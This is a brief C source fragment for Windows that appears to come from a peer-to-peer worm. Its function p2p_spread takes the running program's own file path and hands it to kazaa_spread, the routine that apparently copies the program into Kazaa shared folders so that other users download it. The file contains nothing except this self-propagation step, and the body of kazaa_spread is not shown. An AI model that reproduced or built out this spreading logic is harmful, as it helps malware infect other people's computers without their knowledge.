#include "data_globals.h"
#include <windows.h>

void p2p_spread(void)
{
    char selfpath[MAX_PATH];
    GetModuleFileNameA(NULL, selfpath, MAX_PATH);
    kazaa_spread(selfpath);
}
